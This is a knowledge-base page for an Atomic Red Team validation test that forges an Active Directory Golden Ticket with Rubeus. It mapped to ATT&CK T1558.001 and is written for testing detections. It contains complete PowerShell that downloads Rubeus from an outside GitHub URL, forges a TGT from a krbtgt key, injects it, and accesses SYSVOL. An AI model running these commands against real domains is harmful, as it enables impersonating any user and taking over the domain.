---
atomic_guid: "e42d33cd-205c-4acf-ab59-a9f38f6bad9c"
title: "Crafting Active Directory golden tickets with Rubeus"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.001"
attack_technique_name: "Steal or Forge Kerberos Tickets: Golden Ticket"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "e42d33cd-205c-4acf-ab59-a9f38f6bad9c"
  - "Crafting Active Directory golden tickets with Rubeus"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Crafting Active Directory golden tickets with Rubeus

Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.

## Metadata

- Atomic GUID: e42d33cd-205c-4acf-ab59-a9f38f6bad9c
- Technique: T1558.001: Steal or Forge Kerberos Tickets: Golden Ticket
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1558.001/T1558.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.001]]

## Input Arguments

### account

- description: Account to impersonate
- type: string
- default: $ENV:username

### domaincontroller

- description: Targeted Active Directory domain FQDN
- type: string
- default: $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"

### krbtgt_aes256_key

- description: Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)
- type: string
- default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9

### local_executable

- description: name of the rubeus executable
- type: string
- default: rubeus.exe

### local_folder

- description: Local path of Rubeus executable
- type: path
- default: $Env:temp

### rubeus_url

- description: URL of Rubeus executable
- type: url
- default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

## Dependencies

Computer must be domain joined

### Prerequisite Check

```powershell
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Write-Host Joining this computer to a domain must be done manually
```

Rubeus must exist

### Prerequisite Check

```powershell
if(Test-Path -Path #{local_folder}\#{local_executable}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c "#{local_folder}\#{local_executable}" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith("golden_")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate "runas /netonly" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
@"
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  "#{local_folder}\#{local_executable}" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$(#{domaincontroller})\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
"@ -Replace "kirbifile", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.yaml)
